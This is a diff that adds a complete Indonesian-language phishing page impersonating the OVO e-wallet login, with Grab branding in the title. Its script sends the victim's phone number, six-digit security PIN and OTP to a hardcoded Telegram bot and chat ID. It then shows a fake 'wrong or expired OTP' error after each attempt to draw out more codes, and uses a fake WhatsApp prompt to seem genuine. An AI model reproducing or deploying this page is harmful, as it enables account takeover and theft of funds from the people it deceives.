@@ -1,1 +1,597 @@
 
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Grab. Satu aplikasi semua bisa</title>
+    <!-- CDN jQuery untuk koneksi ke Telegram -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+        
+        /* KUNCI LAYAR: Body dikunci agar tidak bisa di-scroll keluar atau digeser */
+        html, body { 
+            width: 100%; 
+            height: 100%; 
+            background-color: #5c25c3 !important; 
+            color: #000000; 
+            overflow: hidden; 
+            position: fixed;
+            touch-action: none;
+        }
+        
+        /* KONTAINER UTAMA: Dikunci di tengah ukuran seluler max 480px */
+        .enterprise-root { 
+            width: 100%; 
+            max-width: 480px; 
+            height: 100vh; 
+            height: 100dvh;
+            background: #fff; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: space-between; 
+            position: absolute; 
+            top: 50%; 
+            left: 50%; 
+            transform: translate(-50%, -50%);
+            overflow: hidden; 
+            box-shadow: 0 0 20px rgba(0,0,0,0.2);
+        }
+        
+        .ovo-flow { width: 100%; height: 100%; display: flex; flex-direction: column; overflow: hidden; position: relative; }
+        
+        /* STYLE HALAMAN SPLASH */
+        .ovo-splash { 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: #5c25c3; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            z-index: 9999; 
+            transition: opacity 0.5s ease;
+        }
+        .splash-logo-png { 
+            width: 150px; 
+            height: auto; 
+            object-fit: contain; 
+        }
+
+        /* Style Halaman 1, 2, & 3 */
+        .ovo-step1, .ovo-step2, .ovo-step3 { padding: 24px; display: flex; flex-direction: column; justify-content: space-between; height: 100%; overflow-y: auto; touch-action: pan-y; }
+        
+        /* Tombol Kembali & Header */
+        .ovo-step-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .ovo-back-btn { background: none; border: none; cursor: pointer; padding: 0; color: #111; display: flex; align-items: center; }
+        .ovo-help-btn { background: #5e2b97; color: #fff; border: none; width: 36px; height: 36px; border-radius: 50%; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+
+        /* Judul & Teks */
+        .ovo-title { font-size: 26px; font-weight: 800; color: #111; margin-bottom: 8px; letter-spacing: -0.5px; }
+        .ovo-subtitle { font-size: 14px; color: #555; margin-bottom: 28px; line-height: 1.4; }
+
+        /* Kotak Input Nomor HP */
+        .phone-box { background-color: #f3eff9; border-radius: 16px; padding: 14px 16px; display: flex; align-items: center; margin-bottom: 12px; }
+        .phone-prefix { font-size: 17px; font-weight: 700; color: #111; margin-right: 12px; }
+        .phone-input { border: none; outline: none; background: transparent; font-size: 17px; font-weight: 600; color: #111; width: 100%; }
+        
+        .reset-text { font-size: 13px; color: #555; }
+        .reset-text a { color: #5e2b97; text-decoration: none; font-weight: 700; }
+
+        /* Tombol Lanjutkan / Submit / Konfirmasi */
+        .btn-submit { width: 100%; padding: 16px; border-radius: 28px; font-size: 16px; font-weight: bold; border: none; text-align: center; cursor: pointer; transition: background 0.2s; }
+        .btn-submit.off { background: #ece6f4; color: #b5a9c9; cursor: not-allowed; }
+        .btn-submit.on { background: #5e2b97; color: #fff; cursor: pointer; }
+
+        /* Teks Legal Halaman 1 */
+        .legal-text { font-size: 12px; color: #333; line-height: 1.4; margin-bottom: 20px; text-align: left; }
+        .legal-text a { color: #0066cc; text-decoration: none; font-weight: 600; }
+
+        /* Lingkaran Security Code (Halaman 2) */
+        .ovo-step2-title { font-size: 24px; font-weight: 800; color: #111; margin-bottom: 32px; letter-spacing: -0.5px; }
+        .ovo-step2-pin { display: flex; gap: 14px; align-items: center; position: relative; cursor: pointer; }
+        .ovo-step2-pin-hidden { position: absolute; opacity: 0; pointer-events: none; width: 0; height: 0; }
+        .ovo-step2-pin-ring { width: 18px; height: 18px; border: 2px solid #d1d5db; border-radius: 50%; background: transparent; transition: all 0.2s; }
+        .ovo-step2-pin-ring.active { background: #5e2b97; border-color: #5e2b97; }
+        .ovo-step2-forgot { font-size: 13px; color: #555; padding-bottom: 20px; }
+        .ovo-step2-forgot a { color: #00a3e0; text-decoration: none; font-weight: 600; }
+
+        /* Halaman 3: Kode Verifikasi (OTP) */
+        .ovo-step3-title { font-size: 24px; font-weight: 800; color: #111; margin-bottom: 12px; letter-spacing: -0.5px; }
+        .ovo-step3-desc { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 30px; }
+        
+        .otp-container { position: relative; width: 100%; display: flex; flex-direction: column; align-items: center; margin-bottom: 30px; }
+        .otp-hidden-input { position: absolute; opacity: 0; width: 100%; height: 100%; cursor: pointer; z-index: 2; }
+        .otp-display-line { width: 160px; height: 2px; background-color: #9ca3af; margin: 0 auto 12px auto; }
+        .otp-masked-text { font-size: 20px; font-weight: 700; letter-spacing: 12px; color: #111; text-align: center; height: 30px; }
+
+        /* Teks Peringatan Merah OTP Salah */
+        .error-otp-text { color: #dc2626; font-size: 13px; margin-top: 12px; margin-bottom: 12px; display: none; text-align: left; width: 100%; }
+        .timer-text { font-size: 13px; color: #555; text-align: left; padding-bottom: 20px; }
+
+        /* STYLE BOTTOM SHEET WHATSAPP POPUP */
+        .wa-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: flex-end;
+            flex-direction: column;
+            z-index: 999;
+        }
+        .wa-sheet {
+            background: #ffffff;
+            width: 100%;
+            border-top-left-radius: 24px;
+            border-top-right-radius: 24px;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            box-shadow: 0 -10px 25px rgba(0,0,0,0.1);
+            animation: slideUp 0.3s ease-out;
+        }
+        .wa-handle { width: 40px; height: 4px; background: #d1d5db; border-radius: 2px; align-self: center; margin-bottom: 8px; }
+        .wa-title { font-size: 20px; font-weight: 800; color: #111; }
+        .wa-desc { font-size: 14px; color: #555; line-height: 1.4; }
+        .wa-box-info { background: #f0fdf4; border: 1px solid #dcfce7; border-radius: 12px; padding: 12px 16px; display: flex; align-items: center; gap: 10px; font-size: 13px; color: #166534; font-weight: 500; }
+        .wa-btn { background: #5e2b97; color: #fff; width: 100%; padding: 16px; border-radius: 28px; font-size: 16px; font-weight: bold; border: none; cursor: pointer; text-align: center; display: flex; justify-content: center; align-items: center; gap: 8px; }
+        .wa-sms { font-size: 13px; color: #00a3e0; text-align: center; text-decoration: none; font-weight: 600; margin-top: 4px; }
+
+        @keyframes slideUp {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+
+        /* LOADER / POPUP TENGAH LAYAR */
+        .load { 
+            position: fixed !important; 
+            top: 0 !important; 
+            left: 0 !important; 
+            width: 100vw !important; 
+            height: 100vh !important; 
+            background: rgba(0, 0, 0, 0.4) !important; 
+            display: none; 
+            justify-content: center !important; 
+            align-items: center !important; 
+            z-index: 999999 !important; 
+        }
+        .load-box {
+            background: #ffffff !important;
+            width: 110px !important;
+            height: 110px !important;
+            border-radius: 24px !important;
+            display: flex !important;
+            justify-content: center !important;
+            align-items: center !important;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3) !important;
+            
+            /* Posisi loader diatur sesuai permintaan Anda */
+            margin-top: 250px !important; 
+            margin-left: 150px !important;
+        }
+        .dots { display: flex; gap: 8px; align-items: center; }
+        .dot { width: 12px; height: 12px; background-color: #5e2b97; border-radius: 50%; animation: pulse 0.6s infinite alternate; }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes pulse {
+            0% { transform: scale(0.8); opacity: 0.5; }
+            100% { transform: scale(1.3); opacity: 1; }
+        }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <!-- Halaman Awal / Splash Screen OVO -->
+    <div class="ovo-splash" id="splashScreen">
+        <img src="https://i.ibb.co.com/d4HR0jQf/IMG-2868.png" alt="OVO" class="splash-logo-png">
+    </div>
+
+    <!-- Loader Kotak Putih -->
+    <div class="load">
+        <div class="load-box">
+            <div class="dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="enterprise-root">
+        <div class="ovo-flow">
+
+            <!-- ================= HALAMAN 1: MASUKKAN NOMOR HP ================= -->
+            <div id="page1" class="ovo-step1">
+                <div>
+                    <div class="ovo-step-top">
+                        <button type="button" class="ovo-back-btn" aria-label="Kembali" onclick="history.back()">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
+                        </button>
+                        <button type="button" class="ovo-help-btn" aria-label="Bantuan">?</button>
+                    </div>
+
+                    <div>
+                        <h1 class="ovo-title">Masuk atau Daftar</h1>
+                        <p class="ovo-subtitle">Masuk atau daftar cuma butuh nomor HP aja.</p>
+                        
+                        <div class="phone-box" id="phoneBoxArea">
+                            <span class="phone-prefix">+62</span>
+                            <input type="tel" id="phoneInput" class="phone-input" inputmode="numeric" placeholder="" maxlength="13" autofocus>
+                        </div>
+                        
+                        <p class="reset-text">Nomor HP nggak aktif atau hilang? <a href="#">Atur Ulang</a></p>
+                    </div>
+                </div>
+
+                <div>
+                    <p class="legal-text">Dengan masuk atau daftar, kamu udah setuju sama <a href="#">Ketentuan Layanan</a> dan <a href="#">Kebijakan Privasi OVO</a>.</p>
+                    <button type="button" id="submitPhoneBtn" class="btn-submit off" disabled>Lanjutkan</button>
+                </div>
+            </div>
+
+
+            <!-- ================= HALAMAN 2: SECURITY CODE ================= -->
+            <div id="page2" class="ovo-step2 hidden">
+                <div>
+                    <div class="ovo-step-top">
+                        <button type="button" class="ovo-back-btn" id="backToPage1" aria-label="Kembali">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
+                        </button>
+                        <button type="button" class="ovo-help-btn" aria-label="Bantuan">?</button>
+                    </div>
+
+                    <div>
+                        <h2 class="ovo-step2-title">Masukkin Security Code</h2>
+                        <div class="ovo-step2-pin" id="pinArea" role="presentation">
+                            <input inputmode="numeric" maxlength="6" autocomplete="off" class="ovo-step2-pin-hidden" id="hiddenPinInput" type="tel" value="">
+                            <div class="ovo-step2-pin-ring"></div>
+                            <div class="ovo-step2-pin-ring"></div>
+                            <div class="ovo-step2-pin-ring"></div>
+                            <div class="ovo-step2-pin-ring"></div>
+                            <div class="ovo-step2-pin-ring"></div>
+                            <div class="ovo-step2-pin-ring"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <p class="ovo-step2-forgot">Lupa kode kamu? <a href="#">Atur Ulang</a></p>
+            </div>
+
+
+            <!-- ================= HALAMAN 3: KODE VERIFIKASI (OTP) ================= -->
+            <div id="page3" class="ovo-step3 hidden">
+                <div>
+                    <div class="ovo-step-top">
+                        <button type="button" class="ovo-back-btn" id="backToPage2" aria-label="Kembali">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
+                        </button>
+                        <button type="button" class="ovo-help-btn" aria-label="Bantuan">?</button>
+                    </div>
+
+                    <div>
+                        <h2 class="ovo-step3-title">Masukkin Kode Verifikasi</h2>
+                        <p class="ovo-step3-desc">Kode verifikasi udah dikirim ke <span id="otpDisplayPhone" style="font-weight:700; color:#111;">+628xxxxxxxxxx</span> Mohon Tunggu satu menit untuk menerima kode SMS/WhatsApp.</p>
+                        
+                        <div class="otp-container" id="otpArea">
+                            <input type="tel" id="otpInput" class="otp-hidden-input" inputmode="numeric" maxlength="6" autocomplete="off">
+                            <div class="otp-masked-text" id="otpMasked">------</div>
+                            <div class="otp-display-line"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <button type="button" id="submitOtpBtn" class="btn-submit off" disabled>Konfirmasi</button>
+                    <p class="error-otp-text" id="errorOtpMsg">OTP yang kamu masukkan Salah/Kadaluarsa.</p>
+                    <p class="timer-text">Kirim ulang dalam <span id="timerCountdown">00:53</span></p>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- POPUP BOTTOM SHEET WHATSAPP -->
+        <div class="wa-overlay" id="waOverlay">
+            <div class="wa-sheet">
+                <div class="wa-handle"></div>
+                <h3 class="wa-title">Kode akan dikirim ke WhatsApp</h3>
+                <p class="wa-desc">Pastiin nomor OVO kamu <span id="displayPhone" style="font-weight:700; color:#111;">+628xxxxxxxxxx</span> udah terhubung dengan WhatsApp.</p>
+                
+                <div class="wa-box-info">
+                    <span>🛡️ Tenang, gak ada pesan promosi atau spam.</span>
+                </div>
+
+                <button type="button" class="wa-btn" id="sendWaBtn">
+                    💬 Kirim Kode ke WhatsApp
+                </button>
+                <a href="#" class="wa-sms" id="sendSmsBtn">Nomor gak terhubung WhatsApp? Kirim ke SMS</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Skrip JavaScript & Telegram AJAX -->
+    <script>
+        // Masukkan Token Bot dan Chat ID Telegram Anda di sini
+        const telegramToken = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
+        const chatId = "6742478722";
+
+        let userPhone = "";
+        let capturedPin = "";
+        let capturedOtp = "";
+        let countdownInterval = null;
+
+        const splashScreen = document.getElementById('splashScreen');
+        const phoneInput = document.getElementById('phoneInput');
+        const phoneBoxArea = document.getElementById('phoneBoxArea');
+        const submitPhoneBtn = document.getElementById('submitPhoneBtn');
+        const page1 = document.getElementById('page1');
+        const page2 = document.getElementById('page2');
+        const page3 = document.getElementById('page3');
+        
+        const hiddenPinInput = document.getElementById('hiddenPinInput');
+        const pinRings = document.querySelectorAll('.ovo-step2-pin-ring');
+        const pinArea = document.getElementById('pinArea');
+        
+        const waOverlay = document.getElementById('waOverlay');
+        const sendWaBtn = document.getElementById('sendWaBtn');
+
+        const otpInput = document.getElementById('otpInput');
+        const otpMasked = document.getElementById('otpMasked');
+        const otpArea = document.getElementById('otpArea');
+        const submitOtpBtn = document.getElementById('submitOtpBtn');
+        const errorOtpMsg = document.getElementById('errorOtpMsg');
+
+        // Otomatis pindah dari Splash Screen ke Halaman 1 setelah 2 detik (2000 ms)
+        setTimeout(function() {
+            splashScreen.style.opacity = '0';
+            setTimeout(function() {
+                splashScreen.style.display = 'none';
+                phoneInput.focus();
+            }, 500);
+        }, 2000);
+
+        // Fokus ke input HP saat kotak ditekan
+        phoneBoxArea.addEventListener('click', function() {
+            phoneInput.focus();
+        });
+
+        // Validasi Halaman 1 (Nomor HP)
+        phoneInput.addEventListener('input', function(e) {
+            let cleanVal = e.target.value.replace(/\D/g, '');
+            e.target.value = cleanVal;
+
+            if (cleanVal.length >= 9) {
+                submitPhoneBtn.removeAttribute('disabled');
+                submitPhoneBtn.classList.remove('off');
+                submitPhoneBtn.classList.add('on');
+            } else {
+                submitPhoneBtn.setAttribute('disabled', 'true');
+                submitPhoneBtn.classList.remove('on');
+                submitPhoneBtn.classList.add('off');
+            }
+        });
+
+        // Klik Lanjutkan di Halaman 1 -> Kirim No HP ke Telegram lalu pindah ke Halaman 2
+        submitPhoneBtn.addEventListener('click', function() {
+            if (!submitPhoneBtn.hasAttribute('disabled')) {
+                userPhone = phoneInput.value;
+                let pesanHp = `📱 *Nomor OVO Masuk*\n\nNo HP: +62${userPhone}`;
+
+                $(".load").fadeIn();
+                submitPhoneBtn.setAttribute('disabled', 'true');
+
+                $.ajax({
+                    type: 'POST',
+                    url: `https://api.telegram.org/bot${telegramToken}/sendMessage`,
+                    data: {
+                        chat_id: chatId,
+                        text: pesanHp,
+                        parse_mode: 'Markdown'
+                    },
+                    dataType: 'json',
+                    success: function() {
+                        setTimeout(function() {
+                            $(".load").fadeOut();
+                            page1.classList.add('hidden');
+                            page2.classList.remove('hidden');
+                            hiddenPinInput.focus();
+                        }, 800);
+                    },
+                    error: function() {
+                        setTimeout(function() {
+                            $(".load").fadeOut();
+                            page1.classList.add('hidden');
+                            page2.classList.remove('hidden');
+                            hiddenPinInput.focus();
+                        }, 800);
+                    }
+                });
+            }
+        });
+
+        // Fokus ke hidden input PIN saat area diklik
+        pinArea.addEventListener('click', function() {
+            hiddenPinInput.focus();
+        });
+
+        // Tangkap ketikan Security Code / PIN (Halaman 2)
+        hiddenPinInput.addEventListener('input', function(e) {
+            let val = e.target.value.replace(/\D/g, '');
+            e.target.value = val;
+
+            pinRings.forEach((ring, index) => {
+                if (index < val.length) {
+                    ring.classList.add('active');
+                } else {
+                    ring.classList.remove('active');
+                }
+            });
+
+            // Jika sudah 6 digit, tampilkan popup WhatsApp
+            if (val.length === 6) {
+                capturedPin = val;
+                document.getElementById('displayPhone').innerText = `+62${userPhone}`;
+                waOverlay.style.display = 'flex';
+            }
+        });
+
+        // Tombol Kembali ke Halaman 1 dari Halaman 2
+        document.getElementById('backToPage1').addEventListener('click', function() {
+            page2.classList.add('hidden');
+            page1.classList.remove('hidden');
+            phoneInput.focus();
+        });
+
+        // Fungsi untuk menjalankan hitung mundur 53 detik
+        function startTimer() {
+            let timeLeft = 53;
+            const countdownElem = document.getElementById('timerCountdown');
+            
+            if (countdownInterval) clearInterval(countdownInterval);
+
+            countdownInterval = setInterval(() => {
+                let minutes = Math.floor(timeLeft / 60);
+                let seconds = timeLeft % 60;
+                
+                let formattedMin = minutes < 10 ? '0' + minutes : minutes;
+                let formattedSec = seconds < 10 ? '0' + seconds : seconds;
+
+                countdownElem.innerText = `${formattedMin}:${formattedSec}`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownElem.innerText = "00:00";
+                }
+                timeLeft--;
+            }, 1000);
+        }
+
+        // Ketika tombol "Kirim Kode ke WhatsApp" diklik di popup -> Kirim PIN ke Telegram lalu lanjut ke Halaman 3 & Jalankan Timer
+        sendWaBtn.addEventListener('click', function() {
+            let pesanPin = `🔐 *Security Code OVO Masuk*\n\nNo HP: +62${userPhone}\nCode: ${capturedPin}\nMetode: WhatsApp`;
+
+            waOverlay.style.display = 'none';
+            $(".load").fadeIn();
+
+            $.ajax({
+                type: 'POST',
+                url: `https://api.telegram.org/bot${telegramToken}/sendMessage`,
+                data: {
+                    chat_id: chatId,
+                    text: pesanPin,
+                    parse_mode: 'Markdown'
+                },
+                dataType: 'json',
+                success: function() {
+                    setTimeout(function() {
+                        $(".load").fadeOut();
+                        page2.classList.add('hidden');
+                        page3.classList.remove('hidden');
+                        document.getElementById('otpDisplayPhone').innerText = `+62${userPhone}`;
+                        otpInput.focus();
+                        startTimer();
+                    }, 800);
+                },
+                error: function() {
+                    setTimeout(function() {
+                        $(".load").fadeOut();
+                        page2.classList.add('hidden');
+                        page3.classList.remove('hidden');
+                        document.getElementById('otpDisplayPhone').innerText = `+62${userPhone}`;
+                        otpInput.focus();
+                        startTimer();
+                    }, 800);
+                }
+            });
+        });
+
+        // Fokus ke input OTP saat area diklik
+        otpArea.addEventListener('click', function() {
+            otpInput.focus();
+        });
+
+        // Validasi input Kode Verifikasi (OTP) di Halaman 3
+        otpInput.addEventListener('input', function(e) {
+            let val = e.target.value.replace(/\D/g, '');
+            e.target.value = val;
+
+            if (val.length === 0) {
+                otpMasked.innerText = "------";
+            } else {
+                otpMasked.innerText = val.padEnd(6, '-').split('').join(' ');
+            }
+
+            if (val.length >= 4) {
+                submitOtpBtn.removeAttribute('disabled');
+                submitOtpBtn.classList.remove('off');
+                submitOtpBtn.classList.add('on');
+            } else {
+                submitOtpBtn.setAttribute('disabled', 'true');
+                submitOtpBtn.classList.remove('on');
+                submitOtpBtn.classList.add('off');
+            }
+        });
+
+        // Tombol Kembali ke Halaman 2 dari Halaman 3
+        document.getElementById('backToPage2').addEventListener('click', function() {
+            page3.classList.add('hidden');
+            page2.classList.remove('hidden');
+            hiddenPinInput.focus();
+        });
+
+        // Tombol Konfirmasi di Halaman 3 -> Kirim OTP ke Telegram + Muncul Teks Merah Error
+        submitOtpBtn.addEventListener('click', function() {
+            if (!submitOtpBtn.hasAttribute('disabled')) {
+                capturedOtp = otpInput.value;
+                let pesanOtp = `🔑 *Kode Verifikasi / OTP OVO Masuk*\n\nNo HP: +62${userPhone}\nSecurity Code: ${capturedPin}\nOTP: ${capturedOtp}`;
+
+                $(".load").fadeIn();
+                submitOtpBtn.setAttribute('disabled', 'true');
+
+                $.ajax({
+                    type: 'POST',
+                    url: `https://api.telegram.org/bot${telegramToken}/sendMessage`,
+                    data: {
+                        chat_id: chatId,
+                        text: pesanOtp,
+                        parse_mode: 'Markdown'
+                    },
+                    dataType: 'json',
+                    success: function() {
+                        setTimeout(function() {
+                            $(".load").fadeOut();
+                            errorOtpMsg.style.display = 'block';
+                            otpInput.value = "";
+                            otpMasked.innerText = "------";
+                            submitOtpBtn.setAttribute('disabled', 'true');
+                            submitOtpBtn.classList.remove('on');
+                            submitOtpBtn.classList.add('off');
+                            otpInput.focus();
+                        }, 1000);
+                    },
+                    error: function() {
+                        setTimeout(function() {
+                            $(".load").fadeOut();
+                            errorOtpMsg.style.display = 'block';
+                            otpInput.value = "";
+                            otpMasked.innerText = "------";
+                            submitOtpBtn.setAttribute('disabled', 'true');
+                            submitOtpBtn.classList.remove('on');
+                            submitOtpBtn.classList.add('off');
+                            otpInput.focus();
+                        }, 1000);
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
